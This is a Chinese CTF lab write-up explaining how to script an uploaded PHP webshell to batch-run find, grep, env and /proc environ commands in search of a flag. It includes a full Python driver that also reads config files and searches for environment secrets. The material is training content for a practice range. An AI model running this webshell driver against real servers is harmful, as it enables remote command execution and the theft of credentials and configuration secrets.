---
title: 找 flag 的辅助脚本
category: 文件上传/辅助脚本
tags: [geek.ctfplus, webshell, find, 自动化, 回显]
source: geek.ctfplus.cn 靶场
order: 8
---

## 一句话概括

拿到 webshell 后，与其在浏览器里一条条手敲命令，不如写个脚本**批量跑一批探测命令**（`ls` / `find` / `grep` / `env`），自动把含 flag 关键字的结果筛出来并在命中时停下 —— 本质是"把命令执行回显做成可编程的接口"。

## 本题情景与解题手法

### 题目形态

geek 靶场上传成功后，木马落在 `/uploads/` 目录下，形如：

```text
/uploads/<随机文件名>.php
```

木马是 `?1=system('{cmd}');` 这种接参方式（参数名是 `1`）。所以任意命令都可以这样回显：

```text
http://靶机地址/uploads/shell.php?1=system('id');
```

### 第一步：先确认 webshell 回显正常

手工发一条最短命令，看到回显再上脚本：

```http
GET /uploads/shell.php?1=system('id'); HTTP/1.1
Host: 靶机地址
```

有正常回显，说明"命令 -> URL -> 回显"这条链路是通的，可以批量化了。

### 第二步：把命令执行包装成函数

脚本的核心只有一个函数：把命令拼进 URL，取回响应文本。

```python
def execute_command(cmd):
    url = f"{base_url}{webshell}?1=system('{cmd}');"
    return requests.get(url).text
```

关键点：**参数名 `1` 要和木马对上**（不同题可能不同），命令用单引号包起来塞进 `system('...')`。

### 第三步：分层找 flag

flag 可能在任何地方，按"从大到小、从通用到具体"的顺序搜：

1. **全盘按文件名找**：`find / -type f -name '*flag*'`
2. **按内容找**：`find ... | xargs grep -l 'ctfshow'`（flag 里通常带固定前缀）
3. **按目录缩小范围**：`/var`、`/tmp`、`/home`、`/opt`、`/etc`
4. **环境变量 / 进程**：有些题目把 flag 放 `env` 或启动参数里
5. **Web 目录 + 配置文件**：`grep -r 'ctfshow' /var/www/html/`

一旦某个结果含关键字，**读取该文件 → 命中即 `exit()`**，避免空跑。

### 上传手法一句话总结

> webshell 可回显 → 封装一个 `execute_command(cmd)` → 批量跑 `find` / `grep` / `env` 等命令 → 命中含 `ctfshow` 的文件内容就输出并退出。

## 原理

### 1. 为什么脚本化是必要的

手工敲命令的问题：

| 问题 | 后果 |
|---|---|
| flag 位置不确定 | 要试很多条命令 |
| `find /` 输出很长 | 人眼筛选累、易漏 |
| 需要多目录、多模式组合 | 手工重复劳动 |

脚本把"命令列表 + 关键字过滤 + 命中即停"固化下来，一次跑完。

### 2. 几个命令写法的用意

| 写法 | 作用 |
|---|---|
| `2>/dev/null` | 丢弃权限不足/不存在的报错，只留有效结果 |
| `head -20` / `head -5` | 限制输出行数，避免回显过长被截断 |
| `find / -type f -name '*flag*'` | 按文件名通配搜索 |
| `xargs grep -l 'ctfshow'` | 在文件列表中逐个找"含关键字的文件"，`-l` 只打印文件名 |
| `grep -r 'ctfshow' /var/www/html/` | 递归搜内容 |
| `| tr '\0' '\n'` | 把 `/proc/*/environ` 里的 NUL 分隔符换成换行，便于 `grep` |

### 3. 搜索顺序的策略

```text
① 全盘找文件名 *flag*      → 最通用，先跑
② 缩小到常见目录           → 减少噪声
③ 按内容关键字 grep        → 文件名不含 flag 时兜底
④ 环境变量 / 进程 / 配置   → 前三步都没命中时
```

核心判据：**flag 通常带固定前缀（本题为 `ctfshow`）**，用 `grep` 按前缀过滤比人眼翻页可靠得多。

## 命令速查

| 目的 | 命令 |
|---|---|
| 看根目录 | `ls -la /` |
| 全盘找 flag 文件 | `find / -name "flag*" 2>/dev/null \| head -20` |
| 看网站目录 | `ls -la /var/www/html` |
| 当前目录 / 用户 | `pwd` / `whoami` |
| 直接读 flag | `cat /flag` / `cat /flag.txt` |
| 按内容找 | `grep -r 'ctfshow' /var/www/html/ 2>/dev/null \| head -10` |
| 环境变量 | `env \| grep -i flag` |
| 进程参数 | `ps aux \| grep -i flag` |
| 启动环境 | `cat /proc/1/environ \| tr '\0' '\n' \| grep -i flag` |

## 完整脚本

```python
import requests

# 靶机地址与木马路径（原文为一次性 geek 域名 + 随机 uuid，此处抽象）
base_url = "http://靶机地址"
webshell = "/uploads/shell.php"


def execute_command(cmd):
    """把命令拼进木马 URL，返回回显文本"""
    url = f"{base_url}{webshell}?1=system('{cmd}');"
    response = requests.get(url)
    return response.text


print("=== 全面搜索 flag ===")

# 1. 用 find 全面搜索，按文件名找
print("1. 使用 find 命令搜索...")
find_commands = [
    "find / -type f -name '*flag*' 2>/dev/null | head -20",
    "find / -type f -name '*.txt' 2>/dev/null | xargs grep -l 'ctfshow' 2>/dev/null | head -10",
    "find /var -type f -name '*flag*' 2>/dev/null",
    "find /tmp -type f -name '*flag*' 2>/dev/null",
    "find /home -type f -name '*flag*' 2>/dev/null",
    "find /opt -type f -name '*flag*' 2>/dev/null",
    "find /etc -type f -name '*flag*' 2>/dev/null",
]

for cmd in find_commands:
    print(f"执行: {cmd}")
    result = execute_command(cmd)
    if result.strip():
        print(f"找到文件: {result}")

        # 对找到的每个文件，读内容并用关键字确认
        files = result.strip().split('\n')
        for file_path in files:
            if file_path and not file_path.startswith('find:'):
                print(f"读取: {file_path}")
                content = execute_command(f"cat '{file_path}' 2>/dev/null || echo '无法读取'")
                if "ctfshow" in content:
                    print(f"找到 flag: {content}")
                    exit()

# 2. 搜索环境变量和进程
print("\n2. 检查环境变量和进程...")
env_commands = [
    "env | grep -i flag",
    "ps aux | grep -i flag",
    "cat /proc/1/environ | tr '\\0' '\\n' | grep -i flag",
]

for cmd in env_commands:
    result = execute_command(cmd)
    if result.strip():
        print(f"环境/进程信息: {result}")

# 3. 检查 Web 目录详细内容
print("\n3. 详细检查 Web 目录...")
web_commands = [
    "ls -la /var/www/html/",
    "find /var/www/html -type f -name '*.php' | xargs grep -l 'ctfshow' 2>/dev/null",
    "grep -r 'ctfshow' /var/www/html/ 2>/dev/null | head -10",
]

for cmd in web_commands:
    result = execute_command(cmd)
    if result.strip():
        print(f"Web 目录发现: {result}")

# 4. 检查数据库相关文件
print("\n4. 检查数据库和配置文件...")
config_commands = [
    "find / -name '*.env' 2>/dev/null | head -5",
    "find / -name 'config.php' 2>/dev/null | head -5",
    "find / -name '*.sql' 2>/dev/null | head -5",
    "cat /var/www/html/config.php 2>/dev/null || echo '无config.php'",
]

for cmd in config_commands:
    result = execute_command(cmd)
    if result.strip() and "无法读取" not in result:
        print(f"配置文件: {result}")
```

## 踩坑与备注

- **参数名要对上木马**：本题是 `?1=`，换一道题可能是 `?cmd=` / `?a=`。拼接前先确认木马接收的参数名。
- **原文的 URL 是一次性靶场信息**（geek 域名 + 随机 uuid 木马名），已统一抽象成 `靶机地址` / `/uploads/shell.php`；实战时替换成自己那台机器的地址与真实落盘路径。
- **单引号里别出现单引号**：命令被 `system('...')` 包着，命令内部若要用引号，注意转义或用双引号，否则会把 URL 拼坏。
- **`2>/dev/null` 是刚需**：`find /` 会产生大量权限报错，不丢弃的话回显会淹没真正的结果。
- **命中即 `exit()`**：多目录搜时避免空跑和重复输出，找到含关键字的内容就停。
- **回显可能被截断**：命令输出太长时页面可能只显示一截，用 `head` / `grep` 主动收敛输出。
